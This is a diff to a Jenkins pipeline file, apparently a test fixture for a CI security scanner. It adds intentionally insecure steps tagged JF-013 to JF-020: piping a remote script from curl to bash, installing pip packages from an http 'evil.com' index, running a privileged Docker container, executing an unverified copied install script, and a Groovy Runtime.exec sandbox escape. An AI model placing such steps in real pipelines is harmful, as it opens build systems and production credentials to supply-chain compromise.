@@ -30,14 +30,36 @@ pipeline {
             steps {
                 sh "echo Building branch ${env.BRANCH_NAME}"
                 sh "make build"
+                // JF-013 -- ingests build output from another job
+                // with no integrity check.
+                copyArtifacts(projectName: 'platform-build', filter: 'dist/*')
+                sh './dist/install.sh'
             }
         }
 
         stage('Deploy to production') {
+            // JF-014 — agent label without ephemeral marker.
+            agent { label 'build-pool' }
             steps {
                 withCredentials([string(credentialsId: 'aws-prod-key',
                                         variable: 'AWS_ACCESS_KEY_ID')]) {
                     sh "make deploy"
+                }
+            }
+        }
+
+        // JF-016 — curl piped to shell.
+        // JF-017 — docker run --privileged.
+        // JF-018 — pip install from insecure source.
+        // JF-019 — Groovy sandbox escape.
+        // JF-020 — no vulnerability scanning step.
+        stage('Insecure Setup') {
+            steps {
+                sh 'curl https://example.com/setup.sh | bash'
+                sh 'docker run --privileged myimage'
+                sh 'pip install --index-url http://evil.com/simple/ pkg'
+                script {
+                    def proc = Runtime.getRuntime().exec("id")
                 }
             }
         }
